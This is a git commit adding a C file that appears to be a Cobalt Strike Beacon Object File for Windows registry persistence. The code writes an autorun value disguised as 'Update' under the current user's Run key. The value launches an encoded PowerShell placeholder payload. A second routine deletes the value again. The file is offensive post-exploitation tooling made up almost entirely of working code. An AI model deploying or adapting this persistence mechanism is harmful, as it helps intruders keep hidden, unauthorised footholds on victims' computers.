ba9fa729a6578c261f1e6c682c9a2683ac85fbb2
Steve Borosh <rvrsh3ll@users.noreply.github.com>
2020-07-17 15:32:01 -0400

    Create RegistryPersistence.c

---
+++ Persistence/RegistryPersistence.c
@@ -0,0 +1,81 @@
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include "beacon.h"
+
+DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);
+DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
+DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, BYTE*, DWORD);
+DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
+DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteKeyValueW (HKEY, LPCWSTR, LPCWSTR);
+
+void InstallPersistence() {
+    BeaconPrintf(CALLBACK_OUTPUT, "here");
+	HKEY key;
+    WCHAR payload[] = L"powershell -enc AAAAAAAA=="; 
+
+    
+    
+    if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
+    {
+        BeaconPrintf(CALLBACK_OUTPUT,"Key opened \n");
+        if (ADVAPI32$RegSetValueExW(key, L"Update", 0, REG_SZ, (LPBYTE)payload, sizeof(payload)) == ERROR_SUCCESS)
+        {
+            BeaconPrintf(CALLBACK_OUTPUT,"Key changed in registry \n");
+            BeaconPrintf(CALLBACK_OUTPUT,"Persistence Installed \n");
+        }
+        else{
+            BeaconPrintf(CALLBACK_OUTPUT,"Key not changed in registry \n");
+   
+        }
+        ADVAPI32$RegCloseKey(key);
+    }
+    else 
+    {
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to open key  \n");
+        BeaconPrintf(CALLBACK_OUTPUT,"Cannot find key value in registry \n");
+  
+    }
+
+}
+
+void RemovePersistence() {
+	HKEY key;
+    WCHAR keyname[] = L"Update";
+    WCHAR payload[] = L"powershell -enc JDJDJDJDJ=="; 
+    
+    
+    if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
+    {
+        BeaconPrintf(CALLBACK_OUTPUT,"Key location open successful \n");
+        if (ADVAPI32$RegDeleteKeyValueW(key, L"Run", keyname) == ERROR_SUCCESS)
+        {
+            BeaconPrintf(CALLBACK_OUTPUT,"Key deleted in registry \n");
+            BeaconPrintf(CALLBACK_OUTPUT,"Persistence Removed \n");
+        }
+        else{
+            BeaconPrintf(CALLBACK_OUTPUT,"Key not deleted in registry \n");
+   
+        }
+        ADVAPI32$RegCloseKey(key);
+    }
+    else 
+    {
+        BeaconPrintf(CALLBACK_OUTPUT,"Unsuccessful in opening key  \n");
+        BeaconPrintf(CALLBACK_OUTPUT,"Cannot find key value in registry \n");
+  
+    }
+
+}
+
+void go(char * args, int alen) {
+    int result;
+    result = MSVCRT$strcmp(args, "Remove") == 0;
+    if(result > 0) {
+        RemovePersistence();
+    }else {
+        InstallPersistence();
+    }
+    
+}
